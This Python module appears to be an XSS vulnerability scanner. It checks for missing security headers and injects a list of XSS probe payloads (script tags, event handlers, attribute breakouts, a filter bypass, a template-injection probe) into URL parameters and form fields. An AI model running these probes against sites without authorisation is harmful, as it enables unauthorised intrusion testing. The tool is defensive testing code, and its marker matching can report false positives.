import requests
import re
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse

XSS_PAYLOADS = [
    ("<script>alert('XSS')</script>", "Basic Script Tag"),
    ("<img src=x onerror=alert('XSS')>", "Image onerror Event"),
    ("<svg onload=alert('XSS')>", "SVG onload Event"),
    ("'><script>alert(1)</script>", "Attribute Breakout"),
    ("<body onload=alert('XSS')>", "Body Event Handler"),
    ("javascript:alert('XSS')", "JavaScript URI"),
    ("<iframe src='javascript:alert(1)'></iframe>", "IFrame JavaScript"),
    ("\"><img src=x onerror=alert(1)>", "Double-quote Attribute Breakout"),
    ("{{7*7}}", "Template Injection Probe"),
    ("<ScRiPt>alert(1)</ScRiPt>", "Mixed Case Bypass"),
]

REFLECTED_MARKERS = [
    "<script>alert",
    "onerror=alert",
    "onload=alert",
    "javascript:alert",
    "<svg",
    "<iframe",
    "{{7*7}}",
]


def check_security_headers(url, session):
    issues = []
    try:
        resp = session.get(url, timeout=10)
        headers = {k.lower(): v for k, v in resp.headers.items()}

        checks = {
            "content-security-policy": "Missing CSP header - XSS attacks may succeed",
            "x-xss-protection": "Missing X-XSS-Protection header",
            "x-content-type-options": "Missing X-Content-Type-Options header",
            "x-frame-options": "Missing X-Frame-Options - Clickjacking risk",
        }
        for header, message in checks.items():
            if header not in headers:
                issues.append({"header": header, "message": message, "severity": "MEDIUM"})
    except Exception:
        pass
    return issues


def test_reflected_xss_url(url, session):
    findings = []
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    if not params:
        return findings

    for param in params:
        for payload, desc in XSS_PAYLOADS:
            test_params = dict(params)
            test_params[param] = [payload]
            new_query = urlencode(test_params, doseq=True)
            test_url = urlunparse(parsed._replace(query=new_query))
            try:
                resp = session.get(test_url, timeout=8)
                for marker in REFLECTED_MARKERS:
                    if marker.lower() in resp.text.lower():
                        findings.append({
                            "type": "Reflected XSS",
                            "parameter": param,
                            "payload": payload,
                            "description": desc,
                            "severity": "HIGH",
                        })
                        break
            except Exception:
                pass
    return findings


def test_form_xss(url, session):
    findings = []
    try:
        resp = session.get(url, timeout=10)
        form_matches = re.findall(
            r'<form[^>]*action=["\']?([^"\'> ]*)["\']?[^>]*>(.*?)</form>',
            resp.text, re.IGNORECASE | re.DOTALL
        )
        for action, form_body in form_matches:
            inputs = re.findall(
                r'<input[^>]*name=["\']([^"\']+)["\']',
                form_body, re.IGNORECASE
            )
            full_action = urljoin(url, action) if action else url

            for payload, desc in XSS_PAYLOADS:
                data = {inp: payload for inp in inputs}
                try:
                    resp2 = session.post(full_action, data=data, timeout=8)
                    for marker in REFLECTED_MARKERS:
                        if marker.lower() in resp2.text.lower():
                            findings.append({
                                "type": "Form-based XSS",
                                "parameter": str(inputs),
                                "payload": payload,
                                "description": desc,
                                "severity": "HIGH",
                            })
                            break
                except Exception:
                    pass
    except Exception:
        pass
    return findings


def run_xss_test(target_url):
    print(f"\n[*] Starting XSS test on {target_url}...")
    session = requests.Session()
    session.headers.update({"User-Agent": "VulnScanner/1.0 (Security Assessment)"})

    all_findings = []
    header_issues = check_security_headers(target_url, session)
    all_findings += header_issues
    all_findings += test_reflected_xss_url(target_url, session)
    all_findings += test_form_xss(target_url, session)

    high = [f for f in all_findings if f.get("severity") == "HIGH"]
    med = [f for f in all_findings if f.get("severity") == "MEDIUM"]

    if high:
        print(f"  [!] {len(high)} HIGH severity XSS finding(s)!")
    if med:
        print(f"  [!] {len(med)} MEDIUM severity header issue(s)!")
    if not all_findings:
        print(f"  [+] No obvious XSS vulnerabilities detected.")

    return all_findings